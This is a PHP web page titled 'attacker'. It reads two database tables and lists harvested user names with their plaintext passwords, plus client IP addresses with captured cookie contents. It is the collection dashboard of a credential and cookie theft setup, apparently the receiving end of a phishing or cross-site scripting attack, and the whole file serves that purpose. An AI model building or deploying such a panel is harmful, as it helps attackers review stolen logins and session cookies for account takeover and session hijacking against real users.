<?php
  include 'db_functions.php';
    $conn = dbConnect();

    $sqlUsers = "SELECT * FROM users ORDER BY created_at DESC";
    $sqlCookies = "SELECT * FROM cookies ORDER BY created_at DESC";
    $resultUsers = $conn->query($sqlUsers);
    $resultCookies = $conn->query($sqlCookies);

    $conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>attacker</title>
  <script src="https://cdn.tailwindcss.com"></script>

</head>
<body>

<div class="container mx-auto py-6 px-4">
<h1 class="text-3xl font-bold underline">
Users
</h1>
<table class="border-collapse table-auto w-full whitespace-no-wrap bg-white table-striped relative">
  <thead>
    <tr class="text-left">
      <th class="py-2 px-3 sticky top-0 border-b border-gray-200 bg-gray-100">
      Name 
      </th>
      <th class="py-2 px-3 sticky top-0 border-b border-gray-200 bg-gray-100">
      Password  
      </th>
    </tr>
  </thead>
  <tbody>
    <?php
      if ($resultUsers->num_rows > 0) {
        while($row = $resultUsers->fetch_assoc()) {
          ?>
      <tr>
        <td class="border-dashed border-t border-gray-200 px-3">
          <?php echo htmlspecialchars($row["name"]);?>
        </td>
        <td class="border-dashed border-t border-gray-200 userId">
          <?php echo htmlspecialchars($row["password"]);?>
        </td>
      </tr>
      <?php
          }} else {echo "0 results";}
      ?>
  </tbody>
</table>
</div>

<div class="container mx-auto py-6 px-4">
<h1 class="text-3xl font-bold underline">
Cookies
</h1>
<table class="border-collapse table-auto w-full whitespace-no-wrap bg-white table-striped relative">
  <thead>
    <tr class="text-left">
      <th class="py-2 px-3 sticky top-0 border-b border-gray-200 bg-gray-100">
      Client IP  
      </th>
      <th class="py-2 px-3 sticky top-0 border-b border-gray-200 bg-gray-100">
      Cookies  
      </th>
    </tr>
  </thead>
  <tbody>
    <?php
      if ($resultCookies->num_rows > 0) {
        while($row = $resultCookies->fetch_assoc()) {
          ?>
      <tr>
        <td class="border-dashed border-t border-gray-200 px-3">
          <?php echo htmlspecialchars($row["client"]);?>
        </td>
        <td class="border-dashed border-t border-gray-200 userId">
          <?php echo htmlspecialchars($row["content"]);?>
        </td>
      </tr>
      <?php
          }} else {echo "0 results";}
      ?>
  </tbody>
</table>
</div>

</body>
</html>